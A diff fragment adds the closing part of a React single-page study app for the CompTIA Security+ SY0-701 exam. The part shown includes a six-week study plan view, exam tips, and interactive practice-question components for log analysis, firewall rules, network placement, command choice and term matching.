+              style={{padding:"6px 9px",borderRadius:4,marginBottom:3,cursor:"pointer",fontSize:11,background:i===conceptPage?`${domainColor}14`:"transparent",color:i===conceptPage?domainColor:C.muted,border:`1px solid ${i===conceptPage?domainColor+"44":"transparent"}`}}>
+              {c.term}
+            </div>
+          ))}
+        </div>
+      )}
+
+      {/* STUDY PLAN */}
+      {mode==="Study Plan" && (
+        <div>
+          <div style={{fontSize:10,color:C.muted,marginBottom:14,letterSpacing:"0.1em"}}>6-WEEK EXAM PREP PLAN</div>
+          {STUDY_PLAN.map((week,i)=>{
+            const d=DOMAINS.find(d=>d.name===week.focus)||{color:C.accent,icon:"🎯"};
+            return(
+              <div key={i} style={{background:C.panel,border:`1px solid ${C.border}`,borderRadius:7,padding:"11px 13px",marginBottom:9}}>
+                <div style={{display:"flex",alignItems:"center",gap:7,marginBottom:7}}>
+                  <span style={{fontSize:14}}>{d.icon}</span>
+                  <div>
+                    <div style={{fontSize:9,color:C.muted}}>WEEK {week.week}</div>
+                    <div style={{fontSize:11,fontWeight:700,color:d.color}}>{week.focus}</div>
+                  </div>
+                </div>
+                {week.tasks.map((t,j)=>(
+                  <div key={j} style={{display:"flex",gap:7,marginBottom:5,alignItems:"flex-start"}}>
+                    <span style={{color:d.color,fontSize:9,marginTop:2,flexShrink:0}}>▸</span>
+                    <span style={{fontSize:11,color:C.muted,lineHeight:1.5}}>{t}</span>
+                  </div>
+                ))}
+              </div>
+            );
+          })}
+          <div style={{background:"#060d18",border:"1px solid #00f5c422",borderRadius:7,padding:11,marginTop:4}}>
+            <div style={{fontSize:10,color:"#00f5c4",fontWeight:700,marginBottom:6}}>💡 EXAM TIPS</div>
+            {["Passing score: 750 out of 900","90 questions, 90 minutes","PBQs appear first — max 5–7 min each","Flag difficult questions and return later","Use process of elimination"].map((t,i)=>(
+              <div key={i} style={{fontSize:10,color:C.muted,marginBottom:4}}>• {t}</div>
+            ))}
+          </div>
+        </div>
+      )}
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   PBQ COMPONENTS
+═══════════════════════════════════════════════ */
+const TYPE_COLOR = {"Log Analysis":C.red,"Drag & Drop":C.yellow,"Firewall Config":C.green,"Network Placement":C.accent,"Command Line":C.purple,"Match Terms":C.muted};
+const DIFF_COLOR = {Easy:C.green,Medium:C.yellow,Hard:C.red};
+
+function LogPBQ({pbq,onComplete}){
+  const [answers,setAnswers]=useState({});
+  const [submitted,setSubmitted]=useState(false);
+  const score=submitted?pbq.questions.filter((q,i)=>answers[i]===q.answer).length:0;
+  return(
+    <div>
+      <div style={{...panel,background:"#050b12",marginBottom:11}}>
+        <div style={{fontSize:9,color:C.muted,marginBottom:5,letterSpacing:"0.08em"}}>AUTH LOG</div>
+        {pbq.log.split("\n").map((line,i)=>{
+          const color=line.includes("AUTH FAIL")?C.red:line.includes("AUTH OK")?C.yellow:line.includes("CMD")?C.purple:C.muted;
+          return<div key={i} style={{...mono,fontSize:9,color,lineHeight:1.8}}>{line}</div>;
+        })}
+      </div>
+      {pbq.questions.map((q,qi)=>(
+        <div key={qi} style={{...panel,marginBottom:9}}>
+          <div style={{fontSize:11,color:C.bright,marginBottom:9,fontWeight:600}}>Q{qi+1}. {q.q}</div>
+          {q.options.map((opt,oi)=>{
+            let border=C.border,bg="transparent",color=C.text;
+            if(submitted){if(oi===q.answer){border=C.green;bg="#05200e";color=C.green;}else if(answers[qi]===oi){border=C.red;bg="#200505";color=C.red;}}
+            else if(answers[qi]===oi){border=C.accent;bg=`${C.accent}10`;color=C.accent;}
+            return<div key={oi} onClick={()=>!submitted&&setAnswers(a=>({...a,[qi]:oi}))}
+              style={{background:bg,border:`1px solid ${border}`,borderRadius:4,padding:"7px 10px",marginBottom:5,cursor:submitted?"default":"pointer",color,fontSize:10,transition:"all 0.15s"}}>
+              <span style={{opacity:0.4,marginRight:5}}>{String.fromCharCode(65+oi)}.</span>{opt}
+            </div>;
+          })}
+          {submitted&&<div style={{fontSize:9,color:C.muted,marginTop:4}}>💡 {q.hint}</div>}
+        </div>
+      ))}
+      {!submitted?(
+        <button onClick={()=>setSubmitted(true)} disabled={Object.keys(answers).length<pbq.questions.length} style={btn(C.accent,Object.keys(answers).length<pbq.questions.length)}>SUBMIT</button>
+      ):(
+        <div style={{...panel,borderColor:(score===pbq.questions.length?C.green:C.yellow)+"44"}}>
+          <div style={{fontSize:12,fontWeight:700,color:score===pbq.questions.length?C.green:C.yellow}}>Score: {score}/{pbq.questions.length}</div>
+          <button onClick={onComplete} style={{...btn(C.accent),marginTop:9}}>NEXT PBQ →</button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function DragPBQ({pbq,onComplete}){
+  const [userOrder,setUserOrder]=useState([...pbq.items]);
+  const [submitted,setSubmitted]=useState(false);
+  const dragIdx=useRef(null);
+  const correctSeq=pbq.correctOrder.map(i=>pbq.items[i]);
+  return(
+    <div>
+      <div style={{fontSize:10,color:C.muted,marginBottom:10}}>Drag to reorder:</div>
+      {userOrder.map((item,i)=>{
+        let borderColor=C.border,bg=C.panel;
+        if(submitted){borderColor=item===correctSeq[i]?C.green+"88":C.red+"88";bg=item===correctSeq[i]?"#05200e":"#200505";}
+        return(
+          <div key={item} draggable onDragStart={()=>dragIdx.current=i} onDragOver={e=>e.preventDefault()} onDrop={()=>{
+            if(dragIdx.current===null||dragIdx.current===i)return;
+            const next=[...userOrder];[next[dragIdx.current],next[i]]=[next[i],next[dragIdx.current]];
+            setUserOrder(next);dragIdx.current=null;
+          }}
+            style={{display:"flex",gap:9,alignItems:"center",background:bg,border:`1px solid ${borderColor}`,borderRadius:5,padding:"9px 11px",marginBottom:7,cursor:submitted?"default":"grab",userSelect:"none"}}>
+            <span style={{fontSize:10,color:C.muted,fontWeight:700,minWidth:14}}>{i+1}</span>
+            <span style={{fontSize:10,color:C.text,flex:1}}>{item}</span>
+            {submitted&&<span style={{fontSize:10,color:item===correctSeq[i]?C.green:C.red}}>{item===correctSeq[i]?"✓":`→${correctSeq.indexOf(item)+1}`}</span>}
+            {!submitted&&<span style={{color:C.muted}}>⋮⋮</span>}
+          </div>
+        );
+      })}
+      {submitted&&(
+        <div style={{...panel,marginTop:4}}>
+          <div style={{fontSize:9,color:C.muted,marginBottom:6}}>CORRECT ORDER:</div>
+          {correctSeq.map((step,i)=>(
+            <div key={i} style={{fontSize:10,color:C.text,marginBottom:4}}>
+              <span style={tag(C.accent)}>{pbq.labels[i]}</span><span style={{marginLeft:7}}>{step}</span>
+            </div>
+          ))}
+          <button onClick={onComplete} style={{...btn(C.accent),marginTop:9}}>NEXT PBQ →</button>
+        </div>
+      )}
+      {!submitted&&<button onClick={()=>setSubmitted(true)} style={btn(C.accent)}>CHECK ORDER</button>}
+    </div>
+  );
+}
+
+function FirewallPBQ({pbq,onComplete}){
+  const [selections,setSelections]=useState({});
+  const [submitted,setSubmitted]=useState(false);
+  const score=submitted?pbq.requirements.filter((r,i)=>selections[i]===r.correct).length:0;
+  return(
+    <div>
+      <div style={{...panel,background:"#050f08",borderColor:C.green+"22",marginBottom:11,...mono}}>
+        <div style={{fontSize:9,color:C.green,marginBottom:5}}>TOPOLOGY</div>
+        <div style={{fontSize:10,color:C.muted,lineHeight:2}}>
+          {"[ Internet ]"}<br/>{"      │ Perimeter FW"}<br/>{"[ DMZ: 10.0.2.0/24 ]"}<br/>{"      │ Internal FW"}<br/>{"[ LAN: 10.0.1.0/24 ]"}
+        </div>
+      </div>
+      {pbq.requirements.map((r,i)=>{
+        const ok=submitted&&selections[i]===r.correct;
+        const bad=submitted&&selections[i]&&selections[i]!==r.correct;
+        return(
+          <div key={i} style={{...panel,marginBottom:9,borderColor:ok?C.green+"44":bad?C.red+"44":C.border}}>
+            <div style={{fontSize:11,color:C.bright,marginBottom:7,fontWeight:600}}>{r.req}</div>
+            <select value={selections[i]||""} onChange={e=>!submitted&&setSelections(s=>({...s,[i]:e.target.value}))}
+              style={{width:"100%",background:"#0a1020",border:`1px solid ${C.border}`,color:C.text,padding:"7px 8px",borderRadius:4,fontSize:10,fontFamily:"inherit",outline:"none"}}>
+              <option value="">— Select a rule —</option>
+              {pbq.ruleOptions.map(opt=><option key={opt} value={opt}>{opt}</option>)}
+            </select>
+            {submitted&&<div style={{fontSize:9,marginTop:5,color:ok?C.green:C.red}}>{ok?"✓ Correct":`✗ Answer: ${r.correct}`}</div>}
+          </div>
+        );
+      })}
+      {!submitted?(
+        <button onClick={()=>setSubmitted(true)} disabled={Object.keys(selections).length<pbq.requirements.length} style={btn(C.accent,Object.keys(selections).length<pbq.requirements.length)}>APPLY RULES</button>
+      ):(
+        <div style={{...panel,borderColor:C.yellow+"44",marginTop:4}}>
+          <div style={{fontSize:12,fontWeight:700,color:score===pbq.requirements.length?C.green:C.yellow}}>Score: {score}/{pbq.requirements.length}</div>
+          <div style={{fontSize:9,color:C.muted,marginTop:4}}>💡 Implicit deny: always place DENY ALL as the last rule.</div>
+          <button onClick={onComplete} style={{...btn(C.accent),marginTop:9}}>NEXT PBQ →</button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function NetworkPBQ({pbq,onComplete}){
+  const [placements,setPlacements]=useState({});
+  const [submitted,setSubmitted]=useState(false);
+  const score=submitted?pbq.devices.filter(d=>placements[d.name]===d.correct).length:0;
+  return(
+    <div>
+      {pbq.devices.map(d=>{
+        const ok=submitted&&placements[d.name]===d.correct;
+        const bad=submitted&&placements[d.name]&&placements[d.name]!==d.correct;
+        return(
+          <div key={d.name} style={{...panel,marginBottom:9,borderColor:ok?C.green+"44":bad?C.red+"44":C.border}}>
+            <div style={{display:"flex",alignItems:"center",gap:7,marginBottom:7}}>
+              <span style={{fontSize:18}}>{d.icon}</span>
+              <span style={{fontSize:11,color:C.bright,fontWeight:600}}>{d.name}</span>
+            </div>
+            <select value={placements[d.name]||""} onChange={e=>!submitted&&setPlacements(p=>({...p,[d.name]:e.target.value}))}
+              style={{width:"100%",background:"#0a1020",border:`1px solid ${C.border}`,color:C.text,padding:"7px 8px",borderRadius:4,fontSize:10,fontFamily:"inherit",outline:"none"}}>
+              <option value="">— Select zone —</option>
+              {pbq.zones.map(z=><option key={z} value={z}>{z}</option>)}
+            </select>
+            {submitted&&<div style={{fontSize:9,marginTop:5,color:ok?C.green:C.red}}>{ok?`✓ ${d.correct}`:`✗ Should be: ${d.correct}`}</div>}
+          </div>
+        );
+      })}
+      {!submitted?(
+        <button onClick={()=>setSubmitted(true)} disabled={Object.keys(placements).length<pbq.devices.length} style={btn(C.accent,Object.keys(placements).length<pbq.devices.length)}>CONFIRM</button>
+      ):(
+        <div style={{...panel,borderColor:C.yellow+"44",marginTop:4}}>
+          <div style={{fontSize:12,fontWeight:700,color:score===pbq.devices.length?C.green:C.yellow}}>Score: {score}/{pbq.devices.length}</div>
+          <button onClick={onComplete} style={{...btn(C.accent),marginTop:9}}>NEXT PBQ →</button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function CmdPBQ({pbq,onComplete}){
+  const [answers,setAnswers]=useState({});
+  const [submitted,setSubmitted]=useState(false);
+  const score=submitted?pbq.tasks.filter((t,i)=>answers[i]===t.answer).length:0;
+  return(
+    <div>
+      <div style={{...panel,background:"#040810",marginBottom:11}}>
+        <div style={{...mono,fontSize:10,color:C.green}}>analyst@forensics-vm:~$ <span style={{color:C.muted}}>_</span></div>
+      </div>
+      {pbq.tasks.map((t,ti)=>(
+        <div key={ti} style={{...panel,marginBottom:9}}>
+          <div style={{fontSize:11,color:C.bright,marginBottom:9,fontWeight:600}}>Task {ti+1}: {t.task}</div>
+          {t.options.map((opt,oi)=>{
+            let border=C.border,bg="transparent",color=C.muted;
+            if(submitted){if(oi===t.answer){border=C.green;bg="#05200e";color=C.green;}else if(answers[ti]===oi){border=C.red;bg="#200505";color=C.red;}}
+            else if(answers[ti]===oi){border=C.accent;bg=`${C.accent}10`;color=C.accent;}
+            return<div key={oi} onClick={()=>!submitted&&setAnswers(a=>({...a,[ti]:oi}))}
+              style={{...mono,background:bg,border:`1px solid ${border}`,borderRadius:4,padding:"7px 10px",marginBottom:5,cursor:submitted?"default":"pointer",color,fontSize:10}}>
+              $ {opt}
+            </div>;
+          })}
+          {submitted&&<div style={{fontSize:9,color:C.muted,marginTop:4}}>💡 {t.hint}</div>}
+        </div>
+      ))}
+      {!submitted?(
+        <button onClick={()=>setSubmitted(true)} disabled={Object.keys(answers).length<pbq.tasks.length} style={btn(C.accent,Object.keys(answers).length<pbq.tasks.length)}>RUN</button>
+      ):(
+        <div style={{...panel,borderColor:C.yellow+"44",marginTop:4}}>
+          <div style={{fontSize:12,fontWeight:700,color:score===pbq.tasks.length?C.green:C.yellow}}>Score: {score}/{pbq.tasks.length}</div>
+          <button onClick={onComplete} style={{...btn(C.accent),marginTop:9}}>NEXT PBQ →</button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function MatchPBQ({pbq,onComplete}){
+  const [matches,setMatches]=useState({});
+  const [submitted,setSubmitted]=useState(false);
+  const shuffled=useRef([...pbq.pairs].sort(()=>Math.random()-0.5)).current;
+  const score=submitted?pbq.pairs.filter(p=>matches[p.term]===p.match).length:0;
+  return(
+    <div>
+      {pbq.pairs.map(p=>{
+        const ok=submitted&&matches[p.term]===p.match;
+        const bad=submitted&&matches[p.term]&&matches[p.term]!==p.match;
+        return(
+          <div key={p.term} style={{...panel,marginBottom:9,borderColor:ok?C.green+"44":bad?C.red+"44":C.border}}>
+            <div style={{fontSize:12,fontWeight:700,color:C.accent,marginBottom:7}}>{p.term}</div>
+            <select value={matches[p.term]||""} onChange={e=>!submitted&&setMatches(m=>({...m,[p.term]:e.target.value}))}
+              style={{width:"100%",background:"#0a1020",border:`1px solid ${C.border}`,color:C.text,padding:"7px 8px",borderRadius:4,fontSize:10,fontFamily:"inherit",outline:"none"}}>
+              <option value="">— Select description —</option>
+              {shuffled.map(m=><option key={m.match} value={m.match}>{m.match}</option>)}
+            </select>
+            {submitted&&<div style={{fontSize:9,marginTop:5,color:ok?C.green:C.red}}>{ok?"✓ Correct":`✗ ${p.match}`}</div>}
+          </div>
+        );
+      })}
+      {!submitted?(
+        <button onClick={()=>setSubmitted(true)} disabled={Object.keys(matches).length<pbq.pairs.length} style={btn(C.accent,Object.keys(matches).length<pbq.pairs.length)}>SUBMIT</button>
+      ):(
+        <div style={{...panel,borderColor:C.yellow+"44",marginTop:4}}>
+          <div style={{fontSize:12,fontWeight:700,color:score===pbq.pairs.length?C.green:C.yellow}}>Score: {score}/{pbq.pairs.length}</div>
+          <button onClick={onComplete} style={{...btn(C.accent),marginTop:9}}>NEXT PBQ →</button>
+        </div>
+      )}
+    </div>
+  );
+}
+
+function PBQApp(){
+  const [current,setCurrent]=useState(null);
+  const [completed,setCompleted]=useState(new Set());
+  const complete=(id)=>{setCompleted(c=>new Set([...c,id]));setCurrent(null);};
+  const pbq=current!==null?PBQS[current]:null;
+  return(
+    <div>
+      <div style={{display:"flex",gap:3,marginBottom:12}}>
+        {PBQS.map((_,i)=><div key={i} style={{flex:1,height:3,borderRadius:2,background:completed.has(i)?C.green:i===current?C.accent:C.border}}/>)}
+      </div>
+      {current===null&&(
+        <div>
+          <div style={{fontSize:9,color:C.muted,marginBottom:5,letterSpacing:"0.08em"}}>PERFORMANCE-BASED QUESTIONS</div>
+          <div style={{fontSize:10,color:C.muted,marginBottom:12,lineHeight:1.6}}>Simulates interactive tasks found at the START of the real exam. Tests applied skills, not memorization.</div>
+          {PBQS.map((p,i)=>(
+            <div key={i} onClick={()=>setCurrent(i)}
+              style={{...panel,marginBottom:9,cursor:"pointer",borderColor:completed.has(i)?C.green+"33":C.border,position:"relative",overflow:"hidden"}}>
+              {completed.has(i)&&<div style={{position:"absolute",inset:0,background:`${C.green}06`}}/>}
+              <div style={{position:"relative"}}>
+                <div style={{display:"flex",gap:5,marginBottom:6,flexWrap:"wrap"}}>
+                  <Badge text={p.type} color={TYPE_COLOR[p.type]}/>
+                  <Badge text={p.difficulty} color={DIFF_COLOR[p.difficulty]}/>
+                  {completed.has(i)&&<Badge text="DONE ✓" color={C.green}/>}
+                </div>
+                <div style={{fontSize:11,color:C.bright,fontWeight:600}}>{p.scenario.slice(0,70)}…</div>
+                <div style={{fontSize:9,color:C.muted,marginTop:4}}>{p.domain}</div>
+              </div>
+            </div>
+          ))}
+        </div>
+      )}
+      {pbq&&(
+        <div>
+          <button onClick={()=>setCurrent(null)} style={{...btn(C.muted),marginBottom:12,padding:"4px 9px"}}>← BACK</button>
+          <div style={{display:"flex",gap:5,marginBottom:9,flexWrap:"wrap"}}>
+            <Badge text={pbq.type} color={TYPE_COLOR[pbq.type]}/>
+            <Badge text={pbq.difficulty} color={DIFF_COLOR[pbq.difficulty]}/>
+          </div>
+          <div style={{fontSize:11,color:C.text,lineHeight:1.7,marginBottom:12}}>{pbq.scenario}</div>
+          {pbq.type==="Log Analysis"      &&<LogPBQ      pbq={pbq} onComplete={()=>complete(pbq.id)}/>}
+          {pbq.type==="Drag & Drop"       &&<DragPBQ     pbq={pbq} onComplete={()=>complete(pbq.id)}/>}
+          {pbq.type==="Firewall Config"   &&<FirewallPBQ  pbq={pbq} onComplete={()=>complete(pbq.id)}/>}
+          {pbq.type==="Network Placement" &&<NetworkPBQ   pbq={pbq} onComplete={()=>complete(pbq.id)}/>}
+          {pbq.type==="Command Line"      &&<CmdPBQ       pbq={pbq} onComplete={()=>complete(pbq.id)}/>}
+          {pbq.type==="Match Terms"       &&<MatchPBQ     pbq={pbq} onComplete={()=>complete(pbq.id)}/>}
+        </div>
+      )}
+    </div>
+  );
+}
+
+/* ═══════════════════════════════════════════════
+   ROOT APP
+═══════════════════════════════════════════════ */
+function App(){
+  const [tab,setTab]=useState("study");
+  const tabs=[{id:"study",label:"STUDY",icon:"📚"},{id:"pbq",label:"PBQ LAB",icon:"⚡"}];
+  return(
+    <div style={{minHeight:"100vh",background:C.bg,color:C.text,fontFamily:"'Courier New', monospace",paddingBottom:80}}>
+      {/* Header */}
+      <div style={{background:C.panel,borderBottom:`1px solid ${C.border}`,padding:"12px 16px",position:"sticky",top:0,zIndex:10}}>
+        <div style={{display:"flex",alignItems:"center",justifyContent:"space-between"}}>
+          <div style={{fontSize:14,fontWeight:700,background:"linear-gradient(90deg,#00f5c4,#38bdf8)",WebkitBackgroundClip:"text",WebkitTextFillColor:"transparent"}}>
+            SEC+ SY0-701
+          </div>
+          <div style={{fontSize:9,color:C.muted}}>CompTIA Study App</div>
+        </div>
+      </div>
+      {/* Content */}
+      <div style={{padding:"14px 16px"}}>
+        {tab==="study"?<StudyApp/>:<PBQApp/>}
+      </div>
+      {/* Bottom Nav */}
+      <div style={{position:"fixed",bottom:0,left:0,right:0,background:C.panel,borderTop:`1px solid ${C.border}`,display:"flex",padding:"8px 0 12px"}}>
+        {tabs.map(t=>(
+          <button key={t.id} onClick={()=>setTab(t.id)}
+            style={{flex:1,background:"none",border:"none",cursor:"pointer",fontFamily:"inherit",padding:"6px 0"}}>
+            <div style={{fontSize:18,marginBottom:2}}>{t.icon}</div>
+            <div style={{fontSize:9,fontWeight:700,letterSpacing:"0.08em",color:tab===t.id?C.accent:C.muted}}>{t.label}</div>
+          </button>
+        ))}
+      </div>
+    </div>
+  );
+}
+
+const root=ReactDOM.createRoot(document.getElementById("root"));
+root.render(<App/>);
+</script>
+</body>
+</html>
